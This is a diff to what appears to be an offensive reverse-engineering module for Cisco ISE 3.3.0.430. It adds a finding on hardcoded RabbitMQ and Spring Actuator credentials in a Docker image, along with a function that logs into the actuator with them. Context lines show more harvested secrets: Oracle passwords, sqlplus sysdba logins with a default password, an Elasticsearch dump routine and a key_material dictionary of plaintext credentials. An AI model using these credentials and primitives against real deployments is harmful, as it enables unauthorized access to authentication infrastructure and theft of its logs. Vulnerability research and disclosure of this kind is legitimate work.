@@ -45,6 +45,7 @@ ISE-F18: CA REST API / OCSP responder running plain HTTP (ports 9444, 2560) [HIG
 ISE-F19: CA NSS DB plaintext password window — ca_nssdb_password.txt no chmod before encryption [HIGH]
 ISE-F20: SQL schema hardcoded Oracle creds — Mali:Mali (plaintext PIP) + handleruser:mohammal (3DES) [CRITICAL]
 ISE-F21: Elasticsearch 6.8.12 on localhost:9200, no auth, no TLS — ISE MNT auth/RADIUS logs [MEDIUM]
+ISE-F22: pi-profiler Docker image hardcoded RabbitMQ dev credential + Actuator admin [MEDIUM]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -736,6 +737,42 @@ Local process (SSRF, cron, sudo, any ISE service running as non-root):
 Default-state shortcut (no KEK present):
   sqlplus cepm/U0l1_6v#k3c@localhost:1521/cpm10
   sqlplus system/U0l1_6v#k3c@localhost:1521/cpm10 as sysdba
+
+=== ISE-F22: pi-profiler Docker image hardcoded credentials ===
+
+Source: pi-profiler:3.3.0.128 Docker image (inside CSCOcpm-pi-profiler-3.3.0-430.x86_64.rpm)
+Layer:  9b53f2db... / app/rmq.properties AND app/application-dev.properties
+
+Hardcoded RabbitMQ credential (NOT a dev-profile-only value — present in generic rmq.properties):
+  rmq.hostname=169.254.2.2
+  rmq.port=5672
+  rmq.username=rabbitmq
+  rmq.password=p#t91PMsjekd
+
+pi-profiler Spring Actuator management credential (dev/local profiles):
+  pi.profiler.username=admin   (from application.properties, all profiles)
+  pi.profiler.password=lab123  (from application-dev.properties + application-local.properties)
+  Endpoint: http://<ise>:9096/pi-profiler/actuator/
+
+Context:
+  - pi-profiler is a Spring Boot app connecting to ISE's internal RabbitMQ (Docker bridge 169.254.2.2)
+  - In production (SPRING_PROFILE=prod,batch), RabbitMQ password is expected from external config
+    at /opt/pi-profiler/config/custom.properties or env injection
+  - rmq.properties is the dev/CI default — may function as fallback if external config absent
+  - p#t91PMsjekd is either the actual dev/staging RabbitMQ password or a CI artifact
+  - admin:lab123 is the management API default if running in dev/local profile
+
+Actuator endpoints exposed (management.endpoints.web.exposure.include=prometheus,metrics,health):
+  GET http://<ise>:9096/pi-profiler/actuator/health
+  GET http://<ise>:9096/pi-profiler/actuator/prometheus
+  GET http://<ise>:9096/pi-profiler/actuator/metrics
+
+Additional: ISE AI Agent (Kairos) binary (21MB Go binary, ise-ai-agent:3.3-0.1.6)
+  - Connects to Cisco Kairos cloud platform
+  - Imports: cisco.com/kairos-common/v3/pkg/cloudproxy
+  - Contains /debug/pprof/ Go profiling endpoint (may be exposed locally)
+  - AWS SDK integration (GetFederationTokenInput, AssumeRoleWithSAMLInput)
+    -> ISE AI agent may use AWS STS for cloud connectivity; AWS creds via key_manager (ISE-F1 chain)
 
 """
 
@@ -1691,20 +1728,60 @@ def dump_elasticsearch_index(index: str = "_all", host: str = ES_HOST,
         return None
 
 
+# ---------------------------------------------------------------------------
+# ISE-F22: pi-profiler Docker image hardcoded credentials
+# ---------------------------------------------------------------------------
+
+PI_PROFILER_RMQ_HOST = "169.254.2.2"
+PI_PROFILER_RMQ_PORT = 5672
+PI_PROFILER_RMQ_USER = "rabbitmq"
+PI_PROFILER_RMQ_PASS_DEV = "p#t91PMsjekd"      # hardcoded in rmq.properties + application-dev.properties
+PI_PROFILER_MGMT_PORT = 9096
+PI_PROFILER_MGMT_PATH = "/pi-profiler/actuator"
+PI_PROFILER_ADMIN_USER = "admin"
+PI_PROFILER_ADMIN_PASS_DEV = "lab123"
+
+
+def probe_pi_profiler_actuator(host: str, port: int = PI_PROFILER_MGMT_PORT,
+                                user: str = PI_PROFILER_ADMIN_USER,
+                                password: str = PI_PROFILER_ADMIN_PASS_DEV) -> Optional[dict]:
+    """
+    ISE-F22: Probe pi-profiler Spring Actuator management endpoint.
+
+    Endpoint: http://<ise>:9096/pi-profiler/actuator/health
+    Default credential (dev/local profiles): admin:lab123
+
+    Returns parsed JSON health dict, or None if unreachable/unauth.
+    """
+    import urllib.request
+    import base64
+    import json
+
+    url = f"http://{host}:{port}{PI_PROFILER_MGMT_PATH}/health"
+    req = urllib.request.Request(url)
+    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
+    req.add_header("Authorization", f"Basic {creds}")
+    try:
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            return json.loads(resp.read().decode())
+    except Exception:
+        return None
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.8.0",
+    "version": "1.9.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
         "ISE-F6", "ISE-F7", "ISE-F8", "ISE-F9", "ISE-F10",
         "ISE-F11", "ISE-F12", "ISE-F13", "ISE-F14", "ISE-F15",
         "ISE-F16", "ISE-F17", "ISE-F18", "ISE-F19",
-        "ISE-F20", "ISE-F21",
+        "ISE-F20", "ISE-F21", "ISE-F22",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20"],
     "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18", "ISE-F19"],
-    "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21"],
+    "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22"],
     "low": ["ISE-F4", "ISE-F17"],
     "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
     "key_material": {
@@ -1716,6 +1793,8 @@ MODULE_META = {
         "ise_f20_handler_pw_pt": "mohammal",
         "ise_f20_pip_user": "Mali",
         "ise_f20_pip_pw": "Mali",
+        "ise_f22_pi_profiler_rmq_pass_dev": "p#t91PMsjekd",
+        "ise_f22_pi_profiler_admin_pass_dev": "lab123",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -1748,5 +1827,6 @@ MODULE_META = {
         "check_nssdb_plaintext_exposed",
         "probe_elasticsearch_localhost",
         "dump_elasticsearch_index",
+        "probe_pi_profiler_actuator",
     ],
 }
